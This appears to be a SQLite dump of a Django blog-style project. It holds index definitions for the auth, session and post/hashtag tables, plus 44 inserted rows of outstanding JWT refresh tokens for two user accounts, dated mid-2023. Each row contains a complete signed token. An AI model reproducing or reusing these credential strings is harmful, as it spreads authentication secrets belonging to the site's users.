CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "token_blacklist_outstandingtoken" ("token" text NOT NULL, "created_at" datetime NULL, "expires_at" datetime NOT NULL, "user_id" integer NULL REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED, "jti" varchar(255) NOT NULL UNIQUE, "id" integer NOT NULL PRIMARY KEY AUTOINCREMENT);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1NzMwNiwiaWF0IjoxNjg1NTcwOTA2LCJqdGkiOiI2NjFkNzJjMDZjYjI0MzZjYmEzMzI5MjVlYTJkOTczNiIsInVzZXJfaWQiOjF9.79U_HaiIXPX_QK00dQwF4G2FjznadfkWIWdszhdnCq4','2023-05-31 22:08:26.457602','2023-06-01 22:08:26',1,'661d72c06cb2436cba332925ea2d9736',1);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1Nzc1MiwiaWF0IjoxNjg1NTcxMzUyLCJqdGkiOiI5ODczMWZiMTc4YTU0NTE5YjBlMTBiZjVjNTdlMGZmNiIsInVzZXJfaWQiOjF9.t7eoN1FPr2qsTLcZqXl8OR5VBNecUE_wVm2PXlMQ4iI','2023-05-31 22:15:52.315046','2023-06-01 22:15:52',1,'98731fb178a54519b0e10bf5c57e0ff6',2);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1Nzc5OCwiaWF0IjoxNjg1NTcxMzk4LCJqdGkiOiJkZGU3ZTVkNTg2NTg0M2UwOTFiMDJjMzQyYjE2Njk1ZiIsInVzZXJfaWQiOjF9.S2vKGLf8Spy5Wbn4xdo_opXKSSllDW78rHL_Q4SVT8E','2023-05-31 22:16:38.074526','2023-06-01 22:16:38',1,'dde7e5d5865843e091b02c342b16695f',3);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1ODkyOCwiaWF0IjoxNjg1NTcyNTI4LCJqdGkiOiIzZDAyYmZjMDdjMmI0NWMzODhhMzA1NDQ2OTBhZjM0MCIsInVzZXJfaWQiOjF9.3r_8GDw1YZ9GqJEGcAe9-HY46cT3pCJCKil0ZhRy97c','2023-05-31 22:35:28.082782','2023-06-01 22:35:28',1,'3d02bfc07c2b45c388a30544690af340',4);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1ODkzOCwiaWF0IjoxNjg1NTcyNTM4LCJqdGkiOiIwZjc4YTYzYjgzZWM0M2QxOGYzN2Q5NjhiNDI1YmZkMyIsInVzZXJfaWQiOjF9.eAAcjKvcDqA0FBPCKLo5c-LtsO3HPsUErhR7CG-xbmI','2023-05-31 22:35:38.537794','2023-06-01 22:35:38',1,'0f78a63b83ec43d18f37d968b425bfd3',5);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1ODk3MywiaWF0IjoxNjg1NTcyNTczLCJqdGkiOiJiYWVlMDcxZTMwOTA0Y2NlOWFiYmYwYTliMzRhNDZjMiIsInVzZXJfaWQiOjF9.Nm7rbhw_QAa5FHvSn19plawKzmuk33NIXGpDCuZ9Mv4','2023-05-31 22:36:13.290037','2023-06-01 22:36:13',1,'baee071e30904cce9abbf0a9b34a46c2',6);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1OTE4MywiaWF0IjoxNjg1NTcyNzgzLCJqdGkiOiI3MDZhMDYxNGU2MGM0ZjMzOTBhYWU1NjFkMTZjYWExMSIsInVzZXJfaWQiOjF9.du7BpsYYx10-AbsLAwPpGs8HgRhoKytzLertmeJDg6A','2023-05-31 22:39:43.508252','2023-06-01 22:39:43',1,'706a0614e60c4f3390aae561d16caa11',7);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1OTI4NywiaWF0IjoxNjg1NTcyODg3LCJqdGkiOiI2YjVkM2E2ZTJkZGI0MzMzODc3MzNiOTVkODUwMWY4MiIsInVzZXJfaWQiOjF9.X_NdIvzIgKy1QmK9bpsppD6vh0kiWHcRSdk5nhgxEOo','2023-05-31 22:41:27.920337','2023-06-01 22:41:27',1,'6b5d3a6e2ddb433387733b95d8501f82',8);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1OTMyMywiaWF0IjoxNjg1NTcyOTIzLCJqdGkiOiI3YzFmNmE2NDhlYzg0MTRiOGZlZTU1MzljNTg3NTM3ZiIsInVzZXJfaWQiOjF9.Cw7IQhyUMR7cct3LxvE6RA2z09D0Uzc4fS5fn6i-9Z0','2023-05-31 22:42:03.864345','2023-06-01 22:42:03',1,'7c1f6a648ec8414b8fee5539c587537f',9);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1OTM2MSwiaWF0IjoxNjg1NTcyOTYxLCJqdGkiOiI1MmEzZGJkMTBhMTE0ZDVlYWQ0OGY0YTJlOTBhZTMwMiIsInVzZXJfaWQiOjF9.ckWL3GUVmMwAlHKQzURZyatbRdGzMAW7_M9-KupRRMs','2023-05-31 22:42:41.014356','2023-06-01 22:42:41',1,'52a3dbd10a114d5ead48f4a2e90ae302',10);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1OTQwMCwiaWF0IjoxNjg1NTczMDAwLCJqdGkiOiJhNTQwNjE1NTE4MzU0ODI4OGRhMjUzN2E3ZTEwMTJkOCIsInVzZXJfaWQiOjF9.twQztsM_RFXdwH99n4m49xH2tX_AZMvprf30GbY_bLg','2023-05-31 22:43:20.615668','2023-06-01 22:43:20',1,'a5406155183548288da2537a7e1012d8',11);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY1OTg2NCwiaWF0IjoxNjg1NTczNDY0LCJqdGkiOiIxNDYxMTg1ZjdkZDE0N2NmYTI0MGZiNDZjZjEwOWM0YiIsInVzZXJfaWQiOjF9.VmyabQUR-Wa-qi60lu9C2HSGA065ItApUHJdWkqJJsg','2023-05-31 22:51:04.154493','2023-06-01 22:51:04',1,'1461185f7dd147cfa240fb46cf109c4b',12);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MDAzNCwiaWF0IjoxNjg1NTczNjM0LCJqdGkiOiIwY2ViZGNlNWNmYzc0MTJhYTEyODFkMTQ0ZjUxNDkzZSIsInVzZXJfaWQiOjF9.vkKp4SZlMznoNI24kj5oDyub0PuVHcXA8tiuXpiDvso','2023-05-31 22:53:54.475045','2023-06-01 22:53:54',1,'0cebdce5cfc7412aa1281d144f51493e',13);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MDIzMywiaWF0IjoxNjg1NTczODMzLCJqdGkiOiJjMWI1ODVkNGRmODg0NmM0ODAxN2RjOWE5ZGEzOWQyMSIsInVzZXJfaWQiOjF9.I1vdx7IEfSSQtATgs7Bt9mbaaImq4Aocjf-hEwh5-TQ','2023-05-31 22:57:13.997303','2023-06-01 22:57:13',1,'c1b585d4df8846c48017dc9a9da39d21',14);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MDI2MCwiaWF0IjoxNjg1NTczODYwLCJqdGkiOiIzYzNhNzc5YjZlN2I0MDQyYWM1ZjZhNGU0NTEzYTQxYSIsInVzZXJfaWQiOjF9.g7oL4y-fSFBGEzpd3gq6us3WTKpQWNhdQv-SdMA4psg','2023-05-31 22:57:40.648766','2023-06-01 22:57:40',1,'3c3a779b6e7b4042ac5f6a4e4513a41a',15);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MDMzNywiaWF0IjoxNjg1NTczOTM3LCJqdGkiOiJkZjhiODViZTdlMTg0YWEzYTQ4ODQ2YWUxMmE3Y2IxZCIsInVzZXJfaWQiOjF9.o0CQQ3XhGzzNBJwcXeB4aJms9u3dpRH0ABwdGxY3Tms','2023-05-31 22:58:57.213143','2023-06-01 22:58:57',1,'df8b85be7e184aa3a48846ae12a7cb1d',16);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MDQxNCwiaWF0IjoxNjg1NTc0MDE0LCJqdGkiOiIxZWU3MGFhZDZkNzU0MDJkYjRiYjdmOGQ5YmQ4YWU2ZCIsInVzZXJfaWQiOjF9.LlvY7CuXg2PR6sZgjIKYq9f2ZVBku7_cY41OwXCzXVo','2023-05-31 23:00:14.077115','2023-06-01 23:00:14',1,'1ee70aad6d75402db4bb7f8d9bd8ae6d',17);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MDU1NiwiaWF0IjoxNjg1NTc0MTU2LCJqdGkiOiI5ZWQyMGFjZmQxNjY0MTE5YTdhYTYzOGNlMWY5OWIyZSIsInVzZXJfaWQiOjF9.mbUKm3QOifTgMijypKgja0pqL_q6Djmq0egC_YZvDxs','2023-05-31 23:02:36.741348','2023-06-01 23:02:36',1,'9ed20acfd1664119a7aa638ce1f99b2e',18);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MDYwOSwiaWF0IjoxNjg1NTc0MjA5LCJqdGkiOiJhYzZkODFlMWNiNzI0NjQ2ODFlMjg0NzI3NWM5ZDQwNiIsInVzZXJfaWQiOjF9.Q6bM6VushFwDnQgMMzXBpUv9LhHjoQna2sSjO103HiI','2023-05-31 23:03:29.507849','2023-06-01 23:03:29',1,'ac6d81e1cb72464681e2847275c9d406',19);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MTY3NiwiaWF0IjoxNjg1NTc1Mjc2LCJqdGkiOiIwZTFmZmMyNDRhNGE0NDkwYmRkNGE1M2RmZTI1YTllMiIsInVzZXJfaWQiOjF9.WIEM2NoqNMpZNmsioHHo3wB8xlLMmOO5HiLb76J6gG0','2023-05-31 23:21:16.515013','2023-06-01 23:21:16',1,'0e1ffc244a4a4490bdd4a53dfe25a9e2',20);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MjU3NCwiaWF0IjoxNjg1NTc2MTc0LCJqdGkiOiI0YzNlMGViNTNiNjg0ZTYyYWFjOTA5Y2ExNDNkOTM0ZCIsInVzZXJfaWQiOjF9.84w4QAEQ8wcARiJCf0XzKTZAWpB3ApOmGkynhPx-WQk','2023-05-31 23:36:14.356048','2023-06-01 23:36:14',1,'4c3e0eb53b684e62aac909ca143d934d',21);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MzA4OSwiaWF0IjoxNjg1NTc2Njg5LCJqdGkiOiI2Y2M3OTBmYjRlZGQ0N2UxYmU3ZjQ2NmFjZjgxOWM1MiIsInVzZXJfaWQiOjF9.M1FlAItBijsotzz9rzNR-ye8Gx_mgNLR4USBedUj1s4','2023-05-31 23:44:49.735426','2023-06-01 23:44:49',1,'6cc790fb4edd47e1be7f466acf819c52',22);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MzM5MSwiaWF0IjoxNjg1NTc2OTkxLCJqdGkiOiI0YTEyYTU0NGI4MWI0OWIxODNlMGRlNTY4ZWQyMGVlOCIsInVzZXJfaWQiOjF9.BiuuV8E8pmG7Qu5TV0-2W2D-jSlAkpmaSW4wjF16l54','2023-05-31 23:49:51.076146','2023-06-01 23:49:51',1,'4a12a544b81b49b183e0de568ed20ee8',23);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MzQ2MCwiaWF0IjoxNjg1NTc3MDYwLCJqdGkiOiIyMDk4NGQ3OWU0M2I0OWE1YmM1NjA5NTFmZjg1NmM5ZCIsInVzZXJfaWQiOjF9.MiEYQ8kZbt8-s9KWzvItH8MP1ydexxPM29ejKF8rRcQ','2023-05-31 23:51:00.536666','2023-06-01 23:51:00',1,'20984d79e43b49a5bc560951ff856c9d',24);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2MzQ5NywiaWF0IjoxNjg1NTc3MDk3LCJqdGkiOiIwNDA4NmMzYTQyYmI0MGU3Yjg3NjMyNTM5MzRlZjYzNCIsInVzZXJfaWQiOjF9.GBHVsro25sZqghn4KXUe40HoipSGmRnjHauVrULaiVk','2023-05-31 23:51:37.106564','2023-06-01 23:51:37',1,'04086c3a42bb40e7b8763253934ef634',25);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2NDA4MiwiaWF0IjoxNjg1NTc3NjgyLCJqdGkiOiI2ZjRjMmM3MDQ1NTQ0NTAyYTRlN2YwYWRiN2U5N2U3MiIsInVzZXJfaWQiOjF9.UyfByWou1AV9ReUfrohDzrRS4jv7RIoie9iTNTbHLWc','2023-06-01 00:01:22.655035','2023-06-02 00:01:22',1,'6f4c2c7045544502a4e7f0adb7e97e72',26);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2NDIyNSwiaWF0IjoxNjg1NTc3ODI1LCJqdGkiOiIzMTlhMzgxZjdhYzg0NTUwOWU1YmZhMDc3NjUyZmJhYSIsInVzZXJfaWQiOjJ9.ws0LoTE2GwC-tniP_u8PDel8iXKP7T7uenokFXe6vJI','2023-06-01 00:03:45.100742','2023-06-02 00:03:45',2,'319a381f7ac845509e5bfa077652fbaa',27);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTY2NDMwNCwiaWF0IjoxNjg1NTc3OTA0LCJqdGkiOiI0OTFjNDA1YjMyOTE0ZmE1ODFlMjdjY2EyNmQwNGNhNCIsInVzZXJfaWQiOjJ9.tdc_AxFYzqWtXLJouWa78HD6VhSvd30kHsGv8ZqC9Tg','2023-06-01 00:05:04.155749','2023-06-02 00:05:04',2,'491c405b32914fa581e27cca26d04ca4',28);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4MzE4MCwiaWF0IjoxNjg1Nzk2NzgwLCJqdGkiOiI4MzZkZTMyMGI0ZjY0MTNkYWFkNWU1YTIxZWFlZGRlZCIsInVzZXJfaWQiOjJ9.kJyJeGzKSFu72S4Pe8b03rM5iewFG6G6dctxCx7bavE','2023-06-03 12:53:00.620800','2023-06-04 12:53:00',2,'836de320b4f6413daad5e5a21eaedded',29);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4MzI2MiwiaWF0IjoxNjg1Nzk2ODYyLCJqdGkiOiI5YTNlOTlmZGYyNGU0OGE0OTFmNTE4MGI2M2ZlNzZmNCIsInVzZXJfaWQiOjF9.Zmy1-GdUspyggOkjYDWc1G_FqMMT_xp3QZr6TR4pg0U','2023-06-03 12:54:22.809590','2023-06-04 12:54:22',1,'9a3e99fdf24e48a491f5180b63fe76f4',30);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4MzMzMCwiaWF0IjoxNjg1Nzk2OTMwLCJqdGkiOiI2MTNmZDM3ZmMxZGE0YWYxYmU2NDgxZmMxMDM2ZWM1MyIsInVzZXJfaWQiOjF9.RGk_fLvRofhCuamzLPjXmZJnA5MLFODqdH89z6QFA9A','2023-06-03 12:55:30.264355','2023-06-04 12:55:30',1,'613fd37fc1da4af1be6481fc1036ec53',31);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4MzM2MiwiaWF0IjoxNjg1Nzk2OTYyLCJqdGkiOiIwMGU4OWU5MmE0MjE0ZDhkOGU3NmRjMjlmYTYzNjE4NiIsInVzZXJfaWQiOjF9.UclpWujANkscmFDiWTF-xpR0UZDzVPwU9wx_Yt_lI1c','2023-06-03 12:56:02.300194','2023-06-04 12:56:02',1,'00e89e92a4214d8d8e76dc29fa636186',32);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4MzQyMiwiaWF0IjoxNjg1Nzk3MDIyLCJqdGkiOiIyM2U2OTUzYTJkNjA0M2YwYWExNGYyNDRiZWIyODg4ZiIsInVzZXJfaWQiOjF9.tw1VATG2v1fjvDS-LRiDE2bW1AhGJz6EgxzuYusPKW8','2023-06-03 12:57:02.567398','2023-06-04 12:57:02',1,'23e6953a2d6043f0aa14f244beb2888f',33);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4Mzk1NiwiaWF0IjoxNjg1Nzk3NTU2LCJqdGkiOiJlNjZhMjkxNDhjYjE0N2Y0OWVmOWQzYmRiMWNlNmUyMiIsInVzZXJfaWQiOjF9.eYTR218Cq3IQka5DYH58QZBK3VPPb4xMLLylk7j-9ZQ','2023-06-03 13:05:56.654250','2023-06-04 13:05:56',1,'e66a29148cb147f49ef9d3bdb1ce6e22',34);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4Mzk3MiwiaWF0IjoxNjg1Nzk3NTcyLCJqdGkiOiIxN2YyM2EyYjY1YTg0MzMyYmIxZGFlOGExYjk5MTcxYiIsInVzZXJfaWQiOjF9.eVN9yU1KDpu3WDnfMVJqAIcgV0lcZS-CHWVkMgNJv0U','2023-06-03 13:06:12.712708','2023-06-04 13:06:12',1,'17f23a2b65a84332bb1dae8a1b99171b',35);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NDIxMiwiaWF0IjoxNjg1Nzk3ODEyLCJqdGkiOiI5NzQ3ZmMwM2Y3YjI0MjE1YjljZTE0NWNlZWE2MDQ4YiIsInVzZXJfaWQiOjF9.iA_FwamQmtp4TpUb9Bv5UWd1aMobtEOp2QDT5L9Mt_c','2023-06-03 13:10:12.500836','2023-06-04 13:10:12',1,'9747fc03f7b24215b9ce145ceea6048b',36);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NDI2MiwiaWF0IjoxNjg1Nzk3ODYyLCJqdGkiOiJiMzFiYzRhYmYxNDM0MTU2OWQ4OWFhMGU3OTEyZTU0NyIsInVzZXJfaWQiOjF9.90OCID4UyzKeiaL3ZPy_-vh9LVmBW9ApV6LMCuayZ44','2023-06-03 13:11:02.113028','2023-06-04 13:11:02',1,'b31bc4abf14341569d89aa0e7912e547',37);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NDQ1NywiaWF0IjoxNjg1Nzk4MDU3LCJqdGkiOiI5ZmE5ODMxMTZmMjQ0NjZmODIxOTdkNTIxNmFiNWVjYSIsInVzZXJfaWQiOjF9.m9XAbGGYF2ViO6Yc-IUJOBz2I2ki4whsBWFNLpYRrT0','2023-06-03 13:14:17.744800','2023-06-04 13:14:17',1,'9fa983116f24466f82197d5216ab5eca',38);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NDY3OSwiaWF0IjoxNjg1Nzk4Mjc5LCJqdGkiOiI0NTQxYzgwODc5MGU0ZmUzODY1Nzg3YWRkY2UyNTY0ZiIsInVzZXJfaWQiOjF9.0J-bftBwpQhWcn9SxPeW0hkAHWO74tTWvjyM916MWCI','2023-06-03 13:17:59.702694','2023-06-04 13:17:59',1,'4541c808790e4fe3865787addce2564f',39);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NDcwNSwiaWF0IjoxNjg1Nzk4MzA1LCJqdGkiOiJkYjRmNDEwOGY2ODM0MWIyYTM4MGJjMDkyM2EzN2FkMSIsInVzZXJfaWQiOjF9.ypOm_hw8CJpOdvW-KQXyhyqT1dyrRzKg3IRYx-jKIbk','2023-06-03 13:18:25.496182','2023-06-04 13:18:25',1,'db4f4108f68341b2a380bc0923a37ad1',40);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NDgzMSwiaWF0IjoxNjg1Nzk4NDMxLCJqdGkiOiJjMzUwZTY0M2ZiYjM0OGVjOWJkMzE3MWUyODViMzFmNSIsInVzZXJfaWQiOjF9.J-TTutqoRgM4yj18cDWsnxka1amxOUrJmzYeiSx4vso','2023-06-03 13:20:31.949431','2023-06-04 13:20:31',1,'c350e643fbb348ec9bd3171e285b31f5',41);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTAxMywiaWF0IjoxNjg1Nzk4NjEzLCJqdGkiOiI2YTJlZGY3MTQ0MWU0ODNmYjRjMDU1MjM5MWVjNDBhZSIsInVzZXJfaWQiOjF9.9OJI-iLvRbqBjl18wSfKPMc_gj1a3L_EXoZyc34l5cA','2023-06-03 13:23:33.767692','2023-06-04 13:23:33',1,'6a2edf71441e483fb4c0552391ec40ae',42);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTExNSwiaWF0IjoxNjg1Nzk4NzE1LCJqdGkiOiJjZDUyZWYxYTRlMDQ0YTcwODRiYmU0M2FiZjU5NmUwOSIsInVzZXJfaWQiOjF9.r0riMyclHKw2gSDXlRsiS-jEg9jslNCxoX-GVyHHnBw','2023-06-03 13:25:15.516742','2023-06-04 13:25:15',1,'cd52ef1a4e044a7084bbe43abf596e09',43);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTE4MCwiaWF0IjoxNjg1Nzk4NzgwLCJqdGkiOiI4YzQ1MzVmYTA2OTU0NjEyYTEyYWEwMDQwNzNiYzkxMCIsInVzZXJfaWQiOjF9.WTNo1VjLAh0qXmNQ73lMU5F3_dIjXXT-bEFsaYigNUo','2023-06-03 13:26:20.670754','2023-06-04 13:26:20',1,'8c4535fa06954612a12aa004073bc910',44);
